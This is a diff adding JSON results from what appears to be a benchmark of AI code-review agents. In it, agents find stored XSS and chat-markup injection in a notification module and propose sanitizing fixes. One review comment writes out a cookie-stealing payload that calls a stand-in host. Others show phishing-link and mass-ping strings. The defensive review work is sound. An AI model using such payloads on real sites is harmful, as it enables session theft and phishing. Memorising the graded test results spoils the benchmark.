+                "startLine": 1,
+                "endLine": 20
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 19,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 2,
+        "after": 2
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/notifications/mentions.ts",
+          "line": 26,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "A commenter can set their display name or body to `<img src=x onerror=\"fetch('https://evil.example?c='+document.cookie)\">` and achieve stored XSS in the victim's notification inbox, executing in the app origin. Wrap both `m.authorName` and `m.body` in `stripInlineMarkup` before building the `html`, matching `mentionEmail`."
+        },
+        {
+          "sourceIndex": 1,
+          "file": "src/notifications/mentions.ts",
+          "line": 20,
+          "severity": "high",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "A commenter can inject `<!channel>` to mass-ping the whole channel or `<https://evil.example|Reset password>` to post a live phishing link from our workspace, matching the same phishing vector previously fixed for email. Pass `m.authorName` and `m.body` through `stripInlineMarkup` before building the `text`."
+        }
+      ],
+      "claims": [
+        {
+          "id": "chat-inbox-markup-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "critical",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 3,
+      "case": "P37-markup-strip-new-sinks",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 166725,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionChat interpolates m.authorName and m.body directly into ChatClient.post's `text`, which the client documents as chat markup (`<url|label>` renders a link, `<!channel>` pings everyone). WHY: a crafted comment body such as `<!channel>` mass-pings the channel, and `<https://evil.example|Reset password>` renders as a live phishing link attributed to our bot, exactly the injection mentionEmail already guards against. HOW: run both fields through stripInlineMarkup before building the text, e.g. `text: `${stripInlineMarkup(m.authorName)} mentioned you: ${stripInlineMarkup(m.body)}\\n<${m.threadUrl}|Open the thread>``.",
+          "keep": true,
+          "rationale": "Confirmed: ChatClient.post's doc contract (clients.ts:6) states `text` uses chat markup, so raw interpolation of m.authorName/m.body allows `<!channel>` mass-pings and `<https://evil.example|label>` phishing links. mentionChat (mentions.ts:22) does NOT apply stripInlineMarkup, whereas the sibling mentionEmail (lines 15-16) does — the sanitizer explicitly targets exactly this chat markup. The claim's root cause and failure path are accurate and no upstream guard prevents it.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts"
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionInbox writes m.authorName and m.body into inbox.add's `html` field without sanitization, even though InboxStore.add is documented as rendering `html` as-is in the web app. WHY: a comment body containing `<img src=x onerror=...>` or `<a href=\"https://evil.example\">Reset password</a>` is stored and executed/rendered in the recipient's notification inbox — stored XSS/phishing, whereas the sibling mentionEmail passes the same fields through stripInlineMarkup. HOW: wrap both fields, e.g. `html: `<strong>${stripInlineMarkup(m.authorName)}</strong> mentioned you: ${stripInlineMarkup(m.body)}``.",
+          "keep": true,
+          "rationale": "Confirmed. src/notifications/mentions.ts:27-30 writes m.authorName and m.body directly into the `html` field of InboxStore.add. src/notifications/clients.ts:11 documents that `html` is rendered as-is in the web app's notification inbox, and sanitize.ts exists precisely for this (every outbound sink should strip markup). The sibling mentionEmail at lines 15-16 already sanitizes the same fields via stripInlineMarkup, but mentionInbox does not, so a comment body/display name carrying HTML (e.g. <img src=x onerror=...>) is stored and rendered unescaped — stored XSS/phishing in the recipient's inbox. The prior decision addressed only mentionEmail (lines 15-16), not this sink. No upstream guard sanitizes these fields; the root cause and failure path are real.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            },
+            {
+              "name": "findFile",
+              "args": {
+                "pattern": "InboxStore*"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 13,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 2,
+        "after": 2
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/notifications/mentions.ts",
+          "line": 27,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "Because `InboxStore.add` renders `html` as-is, unsanitized `m.authorName` and `m.body` in `mentionInbox` can store and render payloads such as `<img src=x onerror=...>` or `<a href=\"https://evil.example\">Reset password</a>` in the recipient's notification inbox, causing stored XSS/phishing while `mentionEmail` already sanitizes the same fields. Wrap both fields in `stripInlineMarkup` when building the `html` passed to `inbox.add`."
+        },
+        {
+          "sourceIndex": 1,
+          "file": "src/notifications/mentions.ts",
+          "line": 21,
+          "severity": "high",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "Because `ChatClient.post` interprets `text` as chat markup, unsanitized `m.authorName` and `m.body` in `mentionChat` let `<!channel>` mass-ping the channel and `<https://evil.example|Reset password>` render as a live phishing link attributed to our bot, the same injection `mentionEmail` guards against. Run both fields through `stripInlineMarkup` before building the `text`."
+        }
+      ],
+      "claims": [
+        {
+          "id": "chat-inbox-markup-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "critical",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 4,
+      "case": "P37-markup-strip-new-sinks",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 222782,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionChat interpolates the untrusted m.authorName and m.body into the chat message without stripInlineMarkup. WHY: ChatClient.post documents chat markup where `<url|label>` renders a link and `<!channel>` pings everyone (clients.ts:6), so an attacker comment body can inject `<!channel>` to ping the entire channel or `<https://evil.example|Reset password>` to render a phishing link, matching exactly the injection sanitize.ts was written to prevent (\"Every outbound sink passes user text through stripInlineMarkup first\"). HOW: pass both fields through stripInlineMarkup before building the text.",
+          "keep": true,
+          "rationale": "Confirmed: mentionChat interpolates untrusted m.authorName and m.body into chat.post text with no stripInlineMarkup, unlike the sibling mentionEmail which sanitizes the same fields. clients.ts:6 documents that chat markup renders links and <!channel> pings, and sanitize.ts:1-3 names exactly these injection vectors. The prior review decision only addressed mentionEmail (a different sink), so it does not cover this line. Root cause and failure path are both real.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts",
+                "startLine": 1,
+                "endLine": 30
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionChat interpolates the untrusted m.authorName and m.body directly into the chat message text without passing them through stripInlineMarkup. WHY: per clients.ts:6 the chat text renders chat markup, so a comment body containing <https://evil.example|Reset password> becomes a live link sent from our app (phishing) and <!channel> mass-pings the channel; the sibling mentionEmail sink already sanitizes, so this new sink silently bypasses the sanitize.ts contract. HOW: wrap both values with stripInlineMarkup before building text (the intended thread link is built from m.threadUrl, so stripping user markup does not lose the real link).",
+          "keep": true,
+          "rationale": "Confirmed. src/notifications/mentions.ts:22 interpolates m.authorName and m.body directly into the chat text with no stripInlineMarkup call, while the sibling mentionEmail (lines 15-16) and the sanitize.ts contract (lines 1-3: 'Every outbound sink passes user text through stripInlineMarkup first') do sanitize. clients.ts:6 explicitly documents that chat `text` renders chat markup: `<url|label>` becomes a link and `<!channel>` pings everyone. So attacker-controlled comment text (author name/body) becomes a live phishing link or a channel-wide ping sent from our app. No downstream ChatClient implementation strips markup (grep shows the only sanitize usage is in mentionEmail). The fix (wrapping both values with stripInlineMarkup) is valid since the intended thread link is built from m.threadUrl. Finding stands.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts",
+                "startLine": 1,
+                "endLine": 60
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts",
+                "startLine": 1,
+                "endLine": 60
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "mentionChat|stripInlineMarkup",
+                "excludeTests": true
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionInbox builds the inbox html from raw m.authorName and m.body without stripInlineMarkup. WHY: clients.ts:11 documents that this html is \"rendered as is in the web app's notification inbox\", so a comment body containing <img src=x onerror=...> is persisted and executes as stored XSS for every recipient who opens their inbox. HOW: pass authorName and body through stripInlineMarkup before building the html string.",
+          "keep": true,
+          "rationale": "Confirmed. src/notifications/mentions.ts:28 builds inbox html directly from raw m.authorName and m.body with no sanitization, while the sibling mentionEmail (lines 15-16) was already fixed to call stripInlineMarkup. clients.ts:11 documents that this html is 'rendered as is in the web app's notification inbox', so untrusted comment text like <img src=x onerror=...> is persisted and executes as stored XSS for every recipient. sanitize.ts:3 states the intended invariant that 'Every outbound sink passes user text through stripInlineMarkup first', which mentionInbox violates. The earlier implemented decision (round-a-P37-markup-strip-new-sinks) covered only mentionEmail, not this separate sink, so it does not resolve this finding.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts",
+                "startLine": 1,
+                "endLine": 60
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts",
+                "startLine": 1,
+                "endLine": 60
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "stripInlineMarkup|InboxStore|add\\(",
+                "glob": "*.ts",
+                "excludeTests": true
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionInbox interpolates the untrusted m.authorName and m.body directly into the html string stored in the notification inbox, unlike mentionEmail which passes both through stripInlineMarkup. WHY: InboxStore.add documents `html` as \"rendered as is in the web app's notification inbox\" (clients.ts:11), so a comment body containing markup (e.g. `<img src=x onerror=...>` or a phishing `<a href=\"https://evil.example\">Reset password</a>`) is stored and executed/rendered for the recipient — a stored XSS. HOW: wrap both fields with stripInlineMarkup (imported already from './sanitize'), mirroring the email path.",
+          "keep": true,
+          "rationale": "Confirmed stored XSS. mentionInbox builds `html: \\`<strong>${m.authorName}</strong> mentioned you: ${m.body}\\`` with raw untrusted input, while mentionEmail applies stripInlineMarkup to the same fields. InboxStore.add documents html as \"rendered as is in the web app's notification inbox\" (clients.ts:11), so markup in a comment body/display name is stored and rendered to the recipient. The sanitize.ts header comment explicitly says every outbound sink should pass user text through stripInlineMarkup, and mentionInbox violates that. The previous decision (round-a-P37) only covered mentionEmail, a different sink, so it does not resolve this. stripInlineMarkup is already imported in the file.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 18,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 4,
+        "after": 4
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/notifications/mentions.ts",
+          "line": 26,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "Because `InboxStore.add` documents `html` as rendered as is in the web app's notification inbox (clients.ts:11), raw `m.authorName` and `m.body` are stored and rendered/executed, allowing stored XSS such as `<img src=x onerror=...>` or a phishing link. Pass both fields through `stripInlineMarkup` from `./sanitize` before building the `html` string, mirroring `mentionEmail`."
+        },
+        {
+          "sourceIndex": 1,
+          "file": "src/notifications/mentions.ts",
+          "line": 20,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "Because `ChatClient.post` renders chat markup where `<url|label>` becomes a link and `<!channel>` pings everyone (clients.ts:6), raw `m.authorName` and `m.body` let an attacker inject `<!channel>` or `<https://evil.example|Reset password>`. Pass both fields through `stripInlineMarkup` before building `text`."
+        },
+        {
+          "sourceIndex": 2,
+          "file": "src/notifications/mentions.ts",
+          "line": 20,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "Because clients.ts:6 says chat text renders chat markup, raw `m.authorName` and `m.body` let a comment body turn `<https://evil.example|Reset password>` into a live phishing link from our app and `< !channel>` into a mass ping, bypassing the `sanitize.ts` contract that `mentionEmail` follows. Wrap both values with `stripInlineMarkup` before building `text`, leaving the intended `m.threadUrl` link intact."
+        },
+        {
+          "sourceIndex": 3,
+          "file": "src/notifications/mentions.ts",
+          "line": 26,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "Because clients.ts:11 documents this `html` as rendered as is in the web app's notification inbox, raw `m.authorName` and `m.body` persist markup such as `<img src=x onerror=...>` and execute as stored XSS for every recipient who opens their inbox. Pass `authorName` and `body` through `stripInlineMarkup` before building the `html` string."
+        }
+      ],
+      "claims": [
+        {
+          "id": "chat-inbox-markup-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "critical",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 5,
+      "case": "P37-markup-strip-new-sinks",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 83985,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionInbox writes raw `m.authorName` and `m.body` into `html` that clients.ts documents as \"rendered as is in the web app's notification inbox\". WHY: a comment/display name containing `<img src=x onerror=...>` or `<script>` executes in the recipient's browser session (stored XSS) and can steal the session or act as the victim. HOW: wrap both values with stripInlineMarkup before interpolation, matching mentionEmail.",
+          "keep": true,
+          "rationale": "Confirmed: clients.ts:11 documents that InboxStore `html` is \"rendered as is in the web app's notification inbox\", and mentions.ts:28 interpolates raw `m.authorName` and `m.body` (untrusted comment/display-name content) into that html. The sibling mentionEmail (line 15-16) already wraps both values with stripInlineMarkup, so the omission in mentionInbox is a real, concrete stored-XSS sink, not a speculative one. No upstream guard sanitizes these values. Keep.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts",
+                "startLine": 1,
+                "endLine": 60
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "mentionInbox|html:",
+                "path": "src/notifications"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts",
+                "startLine": 1,
+                "endLine": 20
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionChat interpolates raw `m.authorName` and `m.body` into `text`, which clients.ts documents as chat markup where `<url|label>` renders a link and `<!channel>` pings everyone. WHY: a malicious comment body can inject `<!channel>` to spam every channel member, or `<https://evil.example|Reset password>` to render an attacker-controlled phishing link in a message from our bot. HOW: pass `m.authorName` and `m.body` through stripInlineMarkup before building the text, as mentionEmail already does.",
+          "keep": true,
+          "rationale": "Confirmed: src/notifications/clients.ts:6 documents that chat `text` uses markup where `<url|label>` renders a link and `<!channel>` pings everyone, and sanitize.ts:1-3 explicitly warns that comment bodies/display names may carry `<!channel>` and `<https://evil.example|Reset password>` markup and that 'every outbound sink passes user text through stripInlineMarkup first.' Line 22 of mentions.ts interpolates raw `m.authorName` and `m.body` with no sanitization, unlike the sibling mentionEmail (lines 15-16) which was patched. This is a real injection sink (mass-ping / phishing link from the bot). The prior decision #1 covered mentionEmail only, not this chat sink, so it does not resolve this finding.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts",
+                "startLine": 1,
+                "endLine": 60
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "url|label|channel|markup|post",
+                "path": "src/notifications/clients.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 14,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 2,
+        "after": 2
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/notifications/mentions.ts",
+          "line": 28,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "Because `mentionInbox` interpolates raw `m.authorName` and `m.body` into `html` that `clients.ts` documents as rendered as-is in the web app's notification inbox, a comment or display name containing `<img src=x onerror=...>` or `<script>` executes in the recipient's browser session as stored XSS and can steal the session or act as the victim. Wrap both values with `stripInlineMarkup` before interpolation, matching `mentionEmail`."
+        },
+        {
+          "sourceIndex": 1,
+          "file": "src/notifications/mentions.ts",
+          "line": 22,
+          "severity": "high",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "Because `mentionChat` interpolates raw `m.authorName` and `m.body` into `text`, which `clients.ts` documents as chat markup where `<url|label>` renders a link and `<!channel>` pings everyone, a malicious comment body can inject `<!channel>` to spam every channel member or `<https://evil.example|Reset password>` to render an attacker-controlled phishing link in a message from our bot. Pass `m.authorName` and `m.body` through `stripInlineMarkup` before building the text, as `mentionEmail` already does."
+        }
+      ],
+      "claims": [
+        {
+          "id": "chat-inbox-markup-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "critical",
+          "pass": true
+        }
+      ]
+    }
+  ]
+}
